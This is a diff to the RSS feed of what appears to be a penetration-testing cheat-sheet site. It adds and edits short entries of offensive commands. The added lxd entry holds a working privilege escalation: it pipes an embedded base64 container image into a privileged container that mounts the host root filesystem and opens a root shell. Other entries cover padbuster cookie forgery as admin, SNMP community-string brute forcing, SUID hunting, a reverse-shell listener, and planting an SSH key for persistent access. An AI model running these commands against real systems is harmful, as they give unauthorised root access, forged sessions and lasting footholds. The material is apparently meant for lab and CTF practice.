@@ -64,6 +64,13 @@
       <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share # Older Windows (e.</description>
     </item>
     <item>
+      <title>Find</title>
+      <link>https://tldrbins.github.io/find/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/find/</guid>
+      <description> Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls </description>
+    </item>
+    <item>
       <title>Flask Cookie</title>
       <link>https://tldrbins.github.io/flask_cookie/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -90,6 +97,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/listeners/</guid>
       <description> nc rlwrap nc -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 #After getting a connection (local) pwncat$ back </description>
+    </item>
+    <item>
+      <title>lxd</title>
+      <link>https://tldrbins.github.io/lxd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/lxd/</guid>
+      <description> Basic Commands # Check if user in lxd group id # List containers lxc list # List image lxc image list Privesc / Container Escape # Upload a 656 bytes conatiner image echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &amp;gt; test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root </description>
     </item>
     <item>
       <title>Metasploit</title>
@@ -183,6 +197,13 @@
       <description> Connect to vpn sudo openvpn my_vpn.ovpn </description>
     </item>
     <item>
+      <title>Padding Oracle</title>
+      <link>https://tldrbins.github.io/padding_oracle/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/padding_oracle/</guid>
+      <description> padbuster Download padbuster&#xA;# 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 # Forge cookie, e.g., user=admin padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 -plaintext user=admin </description>
+    </item>
+    <item>
       <title>Password Cracking</title>
       <link>https://tldrbins.github.io/password_cracking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -225,14 +246,21 @@
       <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
     </item>
     <item>
+      <title>SNMP</title>
+      <link>https://tldrbins.github.io/snmp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/snmp/</guid>
+      <description>onesixtyone Download onesixtyone&#xA;# Brute force community string for snmpwalk use onesixtyone 10.10.11.10 -c /usr/share/doc/onesixtyone/dict.txt snmpwalk Installation sudo apt install snmp # Install Add-on for better result readability sudo apt install snmp-mibs-downloader # Comment out this line in /etc/snmp/snmp.conf # mibs : # Uncomment this line in /etc/snmp/snmp.conf mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf Basic Commands snmpwalk -v2c -c public 10.10.11.10 | tee snmpwalk_result # Query specific OID, e.g, ipAddressIfIndex.ipv6 snmpwalk -v2c -c public 10.</description>
+    </item>
+    <item>
       <title>SSH</title>
       <link>https://tldrbins.github.io/ssh/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ssh/</guid>
-      <description>Check SSH version openssh-server&#xA;Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;#39;&amp;lt;id_rsa.pub&amp;gt;&amp;#39; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa # Fix: no matching host key type found. Their offer: ssh-rsa,ssh-dss ssh user@10.10.11.10 -i id_rsa -oHostKeyAlgorithms=+ssh-rsa Note: Always append a new line in id_rsa key</description>
+      <description>Check SSH version openssh-server&#xA;Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;#39;&amp;lt;id_rsa.pub&amp;gt;&amp;#39; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa # Fix: no matching host key type found. Their offer: ssh-rsa,ssh-dss ssh user@10.</description>
     </item>
     <item>
-      <title>ssl</title>
+      <title>SSL</title>
       <link>https://tldrbins.github.io/ssl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ssl/</guid>
@@ -251,6 +279,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/subdomain_enum/</guid>
       <description> wfuzz download wfuzz&#xA;# HTTP wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com # HTTPS wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u https://example.com -k Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com --hw 10 gobuster gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://example.com Add domain/subdomain to /etc/hosts echo &amp;#34;10.10.11.10 example.com&amp;#34; | sudo tee -a /etc/hosts </description>
+    </item>
+    <item>
+      <title>TFTP</title>
+      <link>https://tldrbins.github.io/tftp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/tftp/</guid>
+      <description>TFTP # Connect tftp 10.10.11.10 # Download get file # Exit quit Note: You need to know the exact filename, there is no directory listing in tftp</description>
     </item>
     <item>
       <title>Upgrade Shell</title>
@@ -285,7 +320,7 @@
       <link>https://tldrbins.github.io/wordpress/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/wordpress/</guid>
-      <description> wpscan Download wpscan&#xA;wpscan --url http://10.10.11.10 -e ap,t,tt,u # You will need an api token to scan vulns wpscan --url http://10.10.11.10 -e ap,t,tt,u --api-token API_KEY </description>
+      <description> wpscan Download wpscan&#xA;# HTTP wpscan --url http://10.10.11.10 -e ap,t,tt,u # HTTPS wpscan --url https://10.10.11.10 -e ap,t,tt,u --disable-tls-checks # You will need an api token to scan vulns wpscan --url http://10.10.11.10 -e ap,t,tt,u --api-token API_KEY </description>
     </item>
   </channel>
 </rss>
